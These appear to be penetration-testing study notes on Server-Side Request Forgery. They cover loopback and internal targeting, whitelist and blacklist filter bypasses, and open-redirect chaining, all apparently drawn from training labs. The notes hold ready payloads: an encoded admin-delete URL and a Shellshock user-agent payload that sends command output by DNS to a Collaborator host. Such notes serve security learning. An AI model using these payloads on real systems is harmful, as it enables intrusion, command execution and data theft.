# Server-Side Request Forgery (SSRF)

Result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems

Allow an attacker to perform arbitrary command execution.

### SSRF Against the Server Itself

* Make an HTTP request back to the server that is hosting the application, via its loopback network interface.
* `127.0.0.1`, `localhost` or alternatives (`2130706433`, `017700000001`, or `127.1`)

### SSRF Against other Back-End Systems

* Sometimes back-end systems/admin interfaces are accessible using private IP address (brute force IP's)

### Blacklist-Based Input Filters

* Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose
* URL encoding for bypass of blacklisted strings
* Using alternatives for localhost

### Whitelist-Based Input Filters

* You can embed credentials in a URL before the hostname, using the `@` character. For eg: `https://expected-host@evil-host`
* You can use the `#` character to indicate a URL fragment. For eg: `https://evil-host#expected-host`
* You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For eg: https://expected-host.evil-host
* You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
* You can use combinations of these techniques together.
* Eg: `http%3A%2F%2F127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos` (app check for the domain name if it is stock.weliketoshop.net
* bypass this filter using `@` and double encoded `#`  (`%2523`)

### Bypassing SSRF Filters via Open Redirection

* Check for any parameter that allows open redirection, try SSRF if possible
* Use the same path above obtained in any other parameter that makes call to internal systems

### Blind SSRF with Shellshock Exploitation

* `() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net`
* Referrer header initiated a http request if URL provided along with the contents of user-agent string
* Provide the shellshock payload in the user-agent header
* Brute force an internal system by providing IP in referrer header which will send the user-agent content and gets executed on the internal system
